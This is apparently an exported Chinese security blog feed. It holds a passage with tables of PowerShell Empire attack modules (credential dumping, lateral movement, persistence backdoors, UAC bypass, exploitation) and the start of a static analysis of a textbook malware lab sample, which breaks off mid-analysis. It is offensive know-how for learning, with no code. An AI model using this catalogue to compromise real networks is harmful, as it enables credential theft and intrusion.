<td>此模块检索未锁定的KeePass数据库的database mastey key信息</td>
</tr>
<tr>
<td>collection/vaults/remove_keepass_config_trigger</td>
<td>该模块从Find-KeePassConfig找到的所有KeePass配置中删除所有触发器</td>
</tr>
</tbody></table>
<h4 id="credentials身份凭证"><a href="#credentials身份凭证" class="headerlink" title="credentials身份凭证"></a>credentials身份凭证</h4><p><img src="https://s1.ax1x.com/2020/08/23/dwdv0P.png" alt="dwdv0P.png"></p>
<table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>credentials/credential_injection*</td>
<td>运行PowerSploit的Invoke-CredentialInjection创建具有明文凭证的登录，而不会触发事件ID 4648使用显式凭据尝试登录</td>
</tr>
<tr>
<td>credentials/enum_cred_store</td>
<td>从Windows凭据管理器中转储当前交互用户的纯文本凭据</td>
</tr>
<tr>
<td>credentials/invoke_kerberoast</td>
<td>为具有非空服务主体名称（SPN）的所有用户请求kerberos票据，并将其提取为John或Hashcat可用格式</td>
</tr>
<tr>
<td>credentials/powerdump*</td>
<td>使用Posh-SecMod的Invoke-PowerDump从本地系统中转储哈希</td>
</tr>
<tr>
<td>credentials/sessiongopher</td>
<td>提取WinSCP已保存的会话和密码</td>
</tr>
<tr>
<td>credentials/tokens</td>
<td>运行PowerSploit的Invoke-TokenManipulation枚举可用的登录令牌，并使用它们创建新的进程</td>
</tr>
<tr>
<td>credentials/vault_credential*</td>
<td>运行PowerSploit的Get-VaultCredential以显示Windows Vault凭证对象，包括明文Web凭证</td>
</tr>
<tr>
<td>credentials/mimikatz/cache*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数以提取MSCache(v2) hashes</td>
</tr>
<tr>
<td>credentials/mimikatz/certs*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数将所有证书提取到本地目录</td>
</tr>
<tr>
<td>credentials/mimikatz/command*</td>
<td>使用自定义命令运行PowerSploit的Invoke-Mimikatz函数</td>
</tr>
<tr>
<td>credentials/mimikatz/dcsync</td>
<td>运行PowerSploit的Invoke-Mimikatz函数，以通过Mimikatz的lsadump::dcsync模块提取给定的帐户密码</td>
</tr>
<tr>
<td>credentials/mimikatz/dcsync_hashdump</td>
<td>运行PowerSploit的Invoke-Mimikatz函数，以使用Mimikatz的lsadump::dcsync模块收集所有域哈希</td>
</tr>
<tr>
<td>credentials/mimikatz/extract_tickets</td>
<td>运行PowerSploit的Invoke-Mimikatz函数，以base64编码形式从内存中提取kerberos票据</td>
</tr>
<tr>
<td>credentials/mimikatz/golden_ticket</td>
<td>运行PowerSploit的Invoke-Mimikatz函数以生成黄金票据并将其注入内存</td>
</tr>
<tr>
<td>credentials/mimikatz/keys*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数以将所有密钥提取到本地目录</td>
</tr>
<tr>
<td>credentials/mimikatz/logonpasswords*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数以从内存中提取纯文本凭据。</td>
</tr>
<tr>
<td>credentials/mimikatz/lsadump*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数以从内存中提取特定的用户哈希。 在域控制器上很有用。</td>
</tr>
<tr>
<td>credentials/mimikatz/mimitokens*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数以列出或枚举令牌。</td>
</tr>
<tr>
<td>credentials/mimikatz/pth*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数以执行sekurlsa::pth来创建一个新进程。</td>
</tr>
<tr>
<td>credentials/mimikatz/purge</td>
<td>运行PowerSploit的Invoke-Mimikatz函数从内存中清除所有当前的kerberos票据</td>
</tr>
<tr>
<td>credentials/mimikatz/sam*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数从安全帐户管理器（SAM）数据库中提取哈希</td>
</tr>
<tr>
<td>credentials/mimikatz/silver_ticket</td>
<td>运行PowerSploit的Invoke-Mimikatz函数，以生成服务器/服务的白银票据并将其注入内存。</td>
</tr>
<tr>
<td>credentials/mimikatz/trust_keys*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数，从域控制器中提取域信任密钥。</td>
</tr>
</tbody></table>
<h4 id="exfiltration数据窃取"><a href="#exfiltration数据窃取" class="headerlink" title="exfiltration数据窃取"></a>exfiltration数据窃取</h4><p><img src="https://s1.ax1x.com/2020/08/23/dwwptS.png" alt="dwwptS.png"></p>
<table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>exfiltration/egresscheck</td>
<td>可用于帮助检查主机与客户端系统之间的出口，详细信息：<a href="https://github.com/stufus/egresscheck-framework" target="_blank" rel="noopener">https://github.com/stufus/egresscheck-framework</a></td>
</tr>
<tr>
<td>exfiltration/exfil_dropbox</td>
<td>下载文件到dropbox</td>
</tr>
</tbody></table>
<h4 id="exploitation漏洞利用"><a href="#exploitation漏洞利用" class="headerlink" title="exploitation漏洞利用"></a>exploitation漏洞利用</h4><p><img src="https://s1.ax1x.com/2020/08/23/dwwmkT.png" alt="dwwmkT.png"></p>
<table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>exploitation/exploit_eternalblue</td>
<td>MS17_010永恒之蓝漏洞利用</td>
</tr>
<tr>
<td>exploitation/exploit_jboss</td>
<td>Jboss漏洞利用</td>
</tr>
<tr>
<td>exploitation/exploit_jenkins</td>
<td>在未授权访问的Jenkins脚本控制台上运行命令</td>
</tr>
</tbody></table>
<h4 id="lateral-movement横向移动"><a href="#lateral-movement横向移动" class="headerlink" title="lateral_movement横向移动"></a>lateral_movement横向移动</h4><p><img src="https://s1.ax1x.com/2020/08/23/d0AtZ6.png" alt="d0AtZ6.png"></p>
<table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>lateral_movement/inveigh_relay</td>
<td>smb中继攻击</td>
</tr>
<tr>
<td>lateral_movement/invoke_dcom</td>
<td>使用DCOM在远程主机上执行stager</td>
</tr>
<tr>
<td>lateral_movement/invoke_executemsbuild</td>
<td>该模块利用WMI和MSBuild编译并执行一个包含Empire launcher的xml文件。</td>
</tr>
<tr>
<td>lateral_movement/invoke_psexec</td>
<td>PsExec横向移动</td>
</tr>
<tr>
<td>lateral_movement/invoke_psremoting</td>
<td>远程PowerShell横向移动</td>
</tr>
<tr>
<td>lateral_movement/invoke_smbexec</td>
<td>SMBExec横向移动</td>
</tr>
<tr>
<td>lateral_movement/invoke_sqloscmd</td>
<td>利用xp_cmdshell横向移动</td>
</tr>
<tr>
<td>lateral_movement/invoke_sshcommand</td>
<td>利用SSH横向移动</td>
</tr>
<tr>
<td>lateral_movement/invoke_wmi</td>
<td>利用WMI横向移动</td>
</tr>
<tr>
<td>lateral_movement/invoke_wmi_debugger</td>
<td>使用WMI将远程机器上的二进制文件的调试器设置为cmd.exe或stager</td>
</tr>
<tr>
<td>lateral_movement/jenkins_script_console</td>
<td>利用未授权访问的Jenkins脚本控制台横向移动</td>
</tr>
<tr>
<td>lateral_movement/new_gpo_immediate_task</td>
<td>利用GPO中的计划任务横向移动</td>
</tr>
</tbody></table>
<h4 id="management管理"><a href="#management管理" class="headerlink" title="management管理"></a>management管理</h4><p><img src="https://s1.ax1x.com/2020/08/23/d0eiT0.png" alt="d0eiT0.png"></p>
<table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>management/enable_rdp*</td>
<td>在远程计算机上启用RDP并添加防火墙例外。</td>
</tr>
<tr>
<td>management/disable_rdp*</td>
<td>在远程计算机上禁用RDP</td>
</tr>
<tr>
<td>management/downgrade_account</td>
<td>在给定的域帐户上设置可逆加密，然后强制下次用户登录时设置密码。</td>
</tr>
<tr>
<td>management/enable_multi_rdp*</td>
<td>允许多个用户建立同时的RDP连接。</td>
</tr>
<tr>
<td>management/get_domain_sid</td>
<td>返回当前指定域的SID</td>
</tr>
<tr>
<td>management/honeyhash*</td>
<td>将人工凭证注入到LSASS</td>
</tr>
<tr>
<td>management/invoke_script</td>
<td>运行自定义脚本</td>
</tr>
<tr>
<td>management/lock</td>
<td>锁定工作站的显示</td>
</tr>
<tr>
<td>management/logoff</td>
<td>从计算机上注销当前用户（或所有用户）</td>
</tr>
<tr>
<td>management/psinject</td>
<td>利用Powershell注入Stephen Fewer形成的ReflectivePick，该ReflectivePick在远程过程中从内存执行PS代码</td>
</tr>
<tr>
<td>management/reflective_inject</td>
<td>利用Powershell注入Stephen Fewer形成的ReflectivePick，该ReflectivePick在远程过程中从内存执行PS代码</td>
</tr>
<tr>
<td>management/restart</td>
<td>重新启动指定的机器</td>
</tr>
<tr>
<td>management/runas</td>
<td>绕过GPO路径限制</td>
</tr>
<tr>
<td>management/shinject</td>
<td>将PIC Shellcode Payload注入目标进程</td>
</tr>
<tr>
<td>management/sid_to_user</td>
<td>将指定的域sid转换为用户</td>
</tr>
<tr>
<td>management/spawn</td>
<td>在新的powershell.exe进程中生成新agent</td>
</tr>
<tr>
<td>management/spawnas</td>
<td>使用指定的登录凭据生成agent</td>
</tr>
<tr>
<td>management/switch_listener</td>
<td>切换listener</td>
</tr>
<tr>
<td>management/timestomp</td>
<td>通过’调用Set-MacAttribute执行类似耗时的功能</td>
</tr>
<tr>
<td>management/user_to_sid</td>
<td>将指定的domain\user转换为domain sid</td>
</tr>
<tr>
<td>management/vnc</td>
<td>Invoke-Vnc在内存中执行VNC代理并启动反向连接</td>
</tr>
<tr>
<td>management/wdigest_downgrade*</td>
<td>将计算机上的wdigest设置为使用显式凭据</td>
</tr>
<tr>
<td>management/zipfolder</td>
<td>压缩目标文件夹以供以后渗透</td>
</tr>
<tr>
<td>management/mailraider/disable_security</td>
<td>此函数检查ObjectModelGuard</td>
</tr>
<tr>
<td>management/mailraider/get_emailitems</td>
<td>返回指定文件夹的所有项目</td>
</tr>
<tr>
<td>management/mailraider/get_subfolders</td>
<td>返回指定顶级文件夹中所有文件夹的列表</td>
</tr>
<tr>
<td>management/mailraider/mail_search</td>
<td>在给定的Outlook文件夹中搜索项目</td>
</tr>
<tr>
<td>management/mailraider/search_gal</td>
<td>返回与指定搜索条件匹配的所有exchange users</td>
</tr>
<tr>
<td>management/mailraider/send_mail</td>
<td>使用自定义或默认模板将电子邮件发送到指定地址。</td>
</tr>
<tr>
<td>management/mailraider/view_email</td>
<td>选择指定的文件夹，然后在指定的索引处输出电子邮件项目</td>
</tr>
</tbody></table>
<h4 id="persistence持久化"><a href="#persistence持久化" class="headerlink" title="persistence持久化"></a>persistence持久化</h4><p><img src="https://s1.ax1x.com/2020/08/23/d0eKmR.png" alt="d0eKmR.png"></p>
<table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>persistence/elevated/registry*</td>
<td>计算机启动项持久化，通过HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run进行持久化，运行一个stager或者脚本</td>
</tr>
<tr>
<td>persistence/elevated/schtasks*</td>
<td>计划任务持久化</td>
</tr>
<tr>
<td>persistence/elevated/wmi*</td>
<td>WMI事件订阅持久化</td>
</tr>
<tr>
<td>persistence/elevated/wmi_updater*</td>
<td>WMI订阅持久化</td>
</tr>
<tr>
<td>persistence/misc/add_netuser</td>
<td>将域用户或本地用户添加到当前（或远程）计算机</td>
</tr>
<tr>
<td>persistence/misc/add_sid_history*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数以执行misc::addsid以添加用户的sid历史记录。 仅适用于域控制器</td>
</tr>
<tr>
<td>persistence/misc/debugger*</td>
<td>将指定目标二进制文件的调试器设置为cmd.exe</td>
</tr>
<tr>
<td>persistence/misc/disable_machine_acct_change*</td>
<td>禁止目标系统的机器帐户自动更改其密码</td>
</tr>
<tr>
<td>persistence/misc/get_ssps</td>
<td>枚举所有已加载的安全软件包</td>
</tr>
<tr>
<td>persistence/misc/install_ssp*</td>
<td>安装安全支持提供程序dll</td>
</tr>
<tr>
<td>persistence/misc/memssp*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数以执行misc::memssp，将所有身份验证事件记录到C:\Windows\System32\mimisla.log</td>
</tr>
<tr>
<td>persistence/misc/skeleton_key*</td>
<td>运行PowerSploit的Invoke-Mimikatz函数来执行misc::skeleton，植入密码mimikatz的万能钥匙。 仅适用于域控制器</td>
</tr>
<tr>
<td>persistence/powerbreach/deaduser</td>
<td>DeadUserBackdoor后门，详细信息：<a href="http://www.sixdub.net/?p=535" target="_blank" rel="noopener">http://www.sixdub.net/?p=535</a></td>
</tr>
<tr>
<td>persistence/powerbreach/eventlog*</td>
<td>启动事件循环后门</td>
</tr>
<tr>
<td>persistence/powerbreach/resolver</td>
<td>启动解析器后门</td>
</tr>
<tr>
<td>persistence/userland/backdoor_lnk</td>
<td>LNK文件后门</td>
</tr>
<tr>
<td>persistence/userland/registry</td>
<td>计算机启动项持久化，通过HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion\Run进行持久化，运行一个stager或者脚本</td>
</tr>
<tr>
<td>persistence/userland/schtasks</td>
<td>计划任务持久化</td>
</tr>
</tbody></table>
<h4 id="privesc权限提升"><a href="#privesc权限提升" class="headerlink" title="privesc权限提升"></a>privesc权限提升</h4><p><img src="https://s1.ax1x.com/2020/08/23/d0e1k6.png" alt="d0e1k6.png"></p>
<table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>privesc/ask</td>
<td>弹出一个对话框，询问用户是否要以管理员身份运行powershell</td>
</tr>
<tr>
<td>privesc/bypassuac</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/bypassuac_env</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/bypassuac_eventvwr</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/bypassuac_fodhelper</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/bypassuac_sdctlbypass</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/bypassuac_tokenmanipulation</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/bypassuac_wscript</td>
<td>UAC bypass</td>
</tr>
<tr>
<td>privesc/getsystem*</td>
<td>获取system特权</td>
</tr>
<tr>
<td>privesc/gpp</td>
<td>利用windows组策略首选项缺陷获取系统帐号</td>
</tr>
<tr>
<td>privesc/mcafee_sitelist</td>
<td>寻找McAfee SiteList.xml文件的纯文本密码</td>
</tr>
<tr>
<td>privesc/ms16-032</td>
<td>MS16-032本地提权</td>
</tr>
<tr>
<td>privesc/ms16-135</td>
<td>MS16-135本地提权</td>
</tr>
<tr>
<td>privesc/tater</td>
<td>利用PowerShell实现的Hot Potato提权</td>
</tr>
<tr>
<td>privesc/powerup/allchecks</td>
<td>检查目标主机的攻击向量以进行权限提升</td>
</tr>
<tr>
<td>privesc/powerup/find_dllhijack</td>
<td>查找通用的.DLL劫持</td>
</tr>
<tr>
<td>privesc/powerup/service_exe_restore</td>
<td>还原备份的服务二进制文件</td>
</tr>
<tr>
<td>privesc/powerup/service_exe_stager</td>
<td>备份服务的二进制文件，并用启动stager.bat的二进制文件替换原始文件</td>
</tr>
<tr>
<td>privesc/powerup/service_exe_useradd</td>
<td>修改目标服务以创建本地用户并将其添加到本地管理员</td>
</tr>
<tr>
<td>privesc/powerup/service_stager</td>
<td>修改目标服务以执行Empire stager</td>
</tr>
<tr>
<td>privesc/powerup/service_useradd</td>
<td>修改目标服务以创建本地用户并将其添加到本地管理员</td>
</tr>
<tr>
<td>privesc/powerup/write_dllhijacker</td>
<td>将可劫持的.dll以及.dll调用的stager.bat一起写到指定路径。 wlbsctrl.dll在Windows 7上运行良好。需要重新启动计算机</td>
</tr>
</tbody></table>
<h4 id="recon侦察"><a href="#recon侦察" class="headerlink" title="recon侦察"></a>recon侦察</h4><p><img src="https://s1.ax1x.com/2020/08/23/d0et6H.png" alt="d0et6H.png"></p>
<table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>recon/find_fruit</td>
<td>在网络范围内搜索潜在的易受攻击的Web服务</td>
</tr>
<tr>
<td>recon/get_sql_server_login_default_pw</td>
<td>发现在当前广播域之内的SQL Server实例</td>
</tr>
<tr>
<td>recon/http_login</td>
<td>针对基本身份验证测试凭据</td>
</tr>
</tbody></table>
<h4 id="situational-awareness态势感知"><a href="#situational-awareness态势感知" class="headerlink" title="situational_awareness态势感知"></a>situational_awareness态势感知</h4><p><img src="https://s1.ax1x.com/2020/08/23/d0ew7t.png" alt="d0ew7t.png"></p>
<table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>situational_awareness/host/antivirusproduct</td>
<td>获取防病毒产品信息</td>
</tr>
<tr>
<td>situational_awareness/host/computerdetails*</td>
<td>枚举有关系统的有用信息</td>
</tr>
<tr>
<td>situational_awareness/host/dnsserver</td>
<td>枚举系统使用的DNS服务器</td>
</tr>
<tr>
<td>situational_awareness/host/findtrusteddocuments</td>
<td>该模块将枚举适当的注册表</td>
</tr>
<tr>
<td>situational_awareness/host/get_pathacl</td>
<td>枚举给定文件路径的ACL</td>
</tr>
<tr>
<td>situational_awareness/host/get_proxy</td>
<td>枚举当前用户的代理服务器和WPAD内容</td>
</tr>
<tr>
<td>situational_awareness/host/get_uaclevel</td>
<td>枚举UAC级别</td>
</tr>
<tr>
<td>situational_awareness/host/monitortcpconnections</td>
<td>监视主机与指定域名或IPv4地址的TCP连接，对于会话劫持和查找与敏感服务进行交互的用户很有用</td>
</tr>
<tr>
<td>situational_awareness/host/paranoia*</td>
<td>持续检查运行过程中是否存在可疑用户</td>
</tr>
<tr>
<td>situational_awareness/host/winenum</td>
<td>收集有关主机和当前用户上下文的相关信息</td>
</tr>
<tr>
<td>situational_awareness/network/arpscan</td>
<td>针对给定范围的IPv4 IP地址执行ARP扫描</td>
</tr>
<tr>
<td>situational_awareness/network/bloodhound</td>
<td>执行BloodHound数据收集</td>
</tr>
<tr>
<td>situational_awareness/network/get_exploitable_system</td>
<td>查询Active Directory以查找可能容易受到Metasploit Exploit的系统</td>
</tr>
<tr>
<td>situational_awareness/network/get_spn</td>
<td>获取服务主体名称（SPN）</td>
</tr>
<tr>
<td>situational_awareness/network/get_sql_instance_domain</td>
<td>返回SQL Server实例列表</td>
</tr>
<tr>
<td>situational_awareness/network/get_sql_server_info</td>
<td>从目标SQL Server返回基本服务器和用户信息</td>
</tr>
<tr>
<td>situational_awareness/network/portscan</td>
<td>使用常规套接字进行简单的端口扫描</td>
</tr>
<tr>
<td>situational_awareness/network/reverse_dns</td>
<td>执行给定IPv4 IP范围的DNS反向查找</td>
</tr>
<tr>
<td>situational_awareness/network/smbautobrute</td>
<td>针对用户名/密码列表运行SMB暴力破解</td>
</tr>
<tr>
<td>situational_awareness/network/smbscanner</td>
<td>在多台机器上测试用户名/密码组合</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/find_foreign_group</td>
<td>枚举给定域的组的所有成员，并查找不在查询域中的用户</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/find_foreign_user</td>
<td>枚举在其主域之外的组中的用户</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/find_gpo_computer_admin</td>
<td>获取计算机（或GPO）对象，并确定哪些用户/组对该对象具有管理访问权限</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/find_gpo_location</td>
<td>获取用户名或组名，并确定其具有通过GPO进行管理访问的计算机</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/find_localadmin_access</td>
<td>在当前用户具有“本地管理员”访问权限的本地域上查找计算机</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/find_managed_security_group</td>
<td>此功能检索域中的所有安全组</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_cached_rdpconnection</td>
<td>使用远程注册表功能来查询计算机上“ Windows远程桌面连接客户端”的所有信息</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_computer</td>
<td>查询当前计算机对象的域</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_dfs_share</td>
<td>返回给定域的所有容错分布式文件系统的列表</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_domain_controller</td>
<td>返回当前域或指定域的域控制器</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_domain_policy</td>
<td>返回给定域或域控制器的默认域或DC策略</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_domain_trust</td>
<td>返回当前域或指定域的所有域信任</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_fileserver</td>
<td>返回从用户主目录提取的所有文件服务器的列表</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_forest</td>
<td>返回有关给定域森林的信息</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_forest_domain</td>
<td>返回给定林的所有域</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_gpo</td>
<td>获取域中所有当前GPO的列表</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_group</td>
<td>获取域中所有当前组的列表</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_group_member</td>
<td>返回给定组的成员</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_localgroup</td>
<td>返回本地或远程计算机上指定本地组中所有当前用户的列表</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_loggedon</td>
<td>执行NetWkstaUserEnum Win32API调用以查询主动登录主机的用户</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_object_acl</td>
<td>返回与特定活动目录对象关联的ACL</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_ou</td>
<td>获取域中所有当前OU的列表</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_rdp_session</td>
<td>在给定的RDP远程服务中查询活动会话和原始IP</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_session</td>
<td>执行NetSessionEnum Win32API调用以查询主机上的活动会话</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_site</td>
<td>获取域中所有当前站点的列表</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_subnet</td>
<td>获取域中所有当前子网的列表</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/get_user</td>
<td>查询给定用户或指定域中用户的信息</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/map_domain_trust</td>
<td>使用.CSV输出映射所有可访问的域信任</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/process_hunter</td>
<td>查询远程机器的进程列表</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/set_ad_object</td>
<td>使用SID，名称或SamAccountName来查询指定的域对象</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/share_finder</td>
<td>在域中的计算机上查找共享</td>
</tr>
<tr>
<td>situational_awareness/network/powerview/user_hunter</td>
<td>查找指定组的用户登录的机器</td>
</tr>
</tbody></table>
<h4 id="trollsploit恶作剧"><a href="#trollsploit恶作剧" class="headerlink" title="trollsploit恶作剧"></a>trollsploit恶作剧</h4><p><img src="https://s1.ax1x.com/2020/08/23/d0egXj.png" alt="d0egXj.png"></p>
<table>
<thead>
<tr>
<th>模块名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>trollsploit/get_schwifty</td>
<td>播放Schwifty视频，同时把计算机音量设置最大</td>
</tr>
<tr>
<td>trollsploit/message</td>
<td>发送一个消息框</td>
</tr>
<tr>
<td>trollsploit/process_killer</td>
<td>终止以特定名称开头的任何进程</td>
</tr>
<tr>
<td>trollsploit/rick_ascii</td>
<td>生成一个新的powershell.exe进程运行Lee Holmes’ ASCII Rick Roll</td>
</tr>
<tr>
<td>trollsploit/rick_astley</td>
<td>运行SadProcessor’s beeping rickroll</td>
</tr>
<tr>
<td>trollsploit/thunderstruck</td>
<td>播放Thunderstruck视频，同时把计算机音量设置最大</td>
</tr>
<tr>
<td>trollsploit/voicetroll</td>
<td>通过目标上的合成语音朗读文本</td>
</tr>
<tr>
<td>trollsploit/wallpaper</td>
<td>将.jpg图片上传到目标机器并将其设置为桌面壁纸</td>
</tr>
<tr>
<td>trollsploit/wlmdr</td>
<td>在任务栏中显示气球提示</td>
</tr>
</tbody></table>
<h1 id="nishang"><a href="#nishang" class="headerlink" title="nishang"></a>nishang</h1><p><strong>这个暂停，等开学后在更新</strong></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>powershell</tag>
        <tag>nishang</tag>
        <tag>powersploit</tag>
        <tag>empire</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次以DLL程序作后门的样本分析</title>
    <url>/2020/07/19/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%A5DLL%E7%A8%8B%E5%BA%8F%E4%BD%9C%E5%90%8E%E9%97%A8%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近快被自己懒哭了，自从这学期结束后这段时间里感觉全都在玩，但实际也没玩的痛快，时间倒是过的挺快，不行，我最近得调整一下。</p>
<p>最近在看《恶意代码分析实战》这本书，把高级静态分析看完了，看到课后有一个样本不错，挺有意思，挺经典的，决定拿来完整分析一波。</p>
<a id="more"></a>

<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>这次的样本总共两个：</p>
<blockquote>
<p>Lab07-03.exe       MD5 : BD62DAB79881BC6EC0F6BE4EEF1075BC</p>
<p>Lab07-03.dll         MD5 : 290934C61DE9176AD682FFDD65F0A669</p>
</blockquote>
<h2 id="基本静态分析"><a href="#基本静态分析" class="headerlink" title="基本静态分析"></a>基本静态分析</h2><p>首先查看一下两个样本中的strings：</p>
<p>先看DLL程序的（部分）：</p>
<p><img src="https://s1.ax1x.com/2020/07/20/UfQn76.png" alt="UfQn76.png"></p>
<p>这里觉得有意思的字符串有：</p>
<blockquote>
<p>exec</p>
<p>sleep</p>
<p>hello</p>
<p>127.26.152.13</p>
</blockquote>
<p>可以看到有一个IP地址，这个恶意代码有可能连接到这个地址。同时也有exec，sleep，hello这些字符串，这些等会在ida pro中查看具体信息。</p>
<p>然后看一下exe程序的字符串（部分）：</p>
<p><img src="https://s1.ax1x.com/2020/07/20/UfQw4S.png" alt="UfQw4S.png"></p>
<p>这里有意思的字符串多了起来：</p>
<blockquote>
<p>kerne132.dll</p>
<p>kernel32.dll</p>
<p>.exe</p>
<p>C:\*</p>
<p>C:\windows\system32\kerne132.dll</p>
<p>kernel32.</p>
<p>Lab07-03.dll</p>
<p>C:\windows\system32\kernel32.dll</p>
<p>WARNING_THIS_WILL_DESTROY_YOUR_MACHINE</p>
</blockquote>
<p>字符串kerne132.dll和kernel32.dll很像，但是是用数字1替换了字母l，里面出现的目录信息告诉有可能用kerne132.dll代替掉了kernel32.dll，但是具体还是得到反汇编里面分析具体功能。而C:\*则告诉我们这个恶意代码有可能在c盘下找什么东西，最后字符串WARNING_THIS_WILL_DESTROY_YOUR_MACHINE，这个应该是《恶意代码分析实战》这本书作者加上的，用来标识这个程序代码为用来学习的人工制品。</p>
<p>现在放到PEID里面看一下基本的静态信息：</p>
<p>先看DLL程序的：<br><img src="https://s1.ax1x.com/2020/07/20/UflCDI.png" alt="UflCDI.png"></p>
<p>其实可看到东西差不多，这个DLL没有加壳，奇怪的作为DLL程序，没有导出函数，它不能被被另一个程序所导入，尽管程序还是可以调用一个LoadLibrary来载入一个DLL程序，但是这一点还是比较值得注意的，然后可以看到DLL程序的导入函数，除了注意和网络相关的ws2_32.dll之外，还要注意其导入了kernel32.dll中的CreatProcess函数，这说明这个程序有可能创建另一个进程。</p>
<p>再看看EXE程序的：</p>
<p><img src="https://s1.ax1x.com/2020/07/20/UflY24.png" alt="UflY24.png"></p>
<p>这里发现几个有意思的导入函数：</p>
<blockquote>
<p>CreateFileA</p>
<p>CreateFileMappingA</p>
<p>MapViewOfFile</p>
<p>IsBadReadPtr</p>
<p>UnmapViewOfFile</p>
<p>CloseHandle</p>
<p>FindFirstFileA</p>
<p>FindClose</p>
<p>FindNextFileA</p>
<p>CopyFileA</p>
</blockquote>
<p>这些函数告诉的信息不少，这个程序有可能打开一个文件，并且映射到内存中去。同时FindFirstFileA和FindNextFileA函数又说明这个程序可能搜索目录，并使用CopyFileA来复制它找到的文件。而且可以看到这个EXE程序并没有导入Lab07-03.dll，LoadLibrary或者GetProAddress，这一点说明这个程序并没有加载那个DLL程序，这一点是比较可疑的。</p>
<h2 id="高级静态分析"><a href="#高级静态分析" class="headerlink" title="高级静态分析"></a>高级静态分析</h2><p>接下来，尝试将两个文件导入到ida pro里面反汇编分析：</p>
<p>首先看一下DLL程序，因为这个程序比较简单：</p>
<p><img src="https://s1.ax1x.com/2020/07/20/UflWqI.png" alt="UflWqI.png"></p>
<p>ida pro这里定位到DllMain的位置，可以看到DllMain这里有很多代码，按照逻辑顺序可以看一下：</p>
<p><img src="https://s1.ax1x.com/2020/07/20/UfRi5V.png" alt="UfRi5V.png"></p>
<p>这里首先用__alloca_probe函数申请了很大一片栈空间</p>
<p><img src="https://s1.ax1x.com/2020/07/20/UfRYKH.png" alt="UfRYKH.png"></p>
<p>之后又通过OpenMutexA函数检查有没有<strong>SADFHUHF</strong>这个互斥量，没有的话就通过CreateMutexA函数建立这个互斥量，这个的目的是让同一时刻只有一个该程序的实例在运行。</p>
<p><img src="https://s1.ax1x.com/2020/07/20/UffFcF.png" alt="UffFcF.png"></p>
<p>之后通过socket连接到一个远程主机127.26.152.13，可以看到0x50h就是十进制80，那么就是连接到远程主机的80端口。</p>
<p><img src="https://s1.ax1x.com/2020/07/20/UffU4P.png" alt="UffU4P.png"></p>
